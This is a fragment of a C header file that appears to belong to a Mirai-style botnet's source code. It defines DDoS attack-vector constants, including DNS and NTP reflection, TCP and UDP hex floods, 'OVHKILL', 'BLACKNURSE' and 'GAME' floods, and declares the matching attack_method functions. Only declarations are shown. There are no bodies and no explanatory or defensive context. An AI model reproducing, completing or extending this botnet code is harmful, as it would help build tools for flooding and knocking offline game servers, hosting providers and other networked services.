...
#define ATK_VEC_DNS        8
#define ATK_VEC_UDP_PLAIN  9
#define ATK_VEC_TCP        10
#define ATK_VEC_STDHEX     11
#define ATK_VEC_ACKHEX     12
#define ATK_VEC_TCPHEX     13
#define ATK_VEC_UDPHEX     14
#define ATK_VEC_OVHHEX     15
#define ATK_VEC_HTTP       16  
#define ATK_VEC_GAME       17
#define ATK_VEC_HOME       18
#define ATK_VEC_OVHKILL    19
#define ATK_VEC_TCPPSH     20
#define ATK_VEC_BLACKNURSE 21
#define ATK_VEC_PHATWONK   22
#define ATK_VEC_PAN        23
#define ATK_VEC_SNMP       24
#define ATK_VEC_NTP        25
...
void attack_method_ovhhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ackhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_stdhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcphex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
void attack_method_game(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_home(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ovhkill(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcppsh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
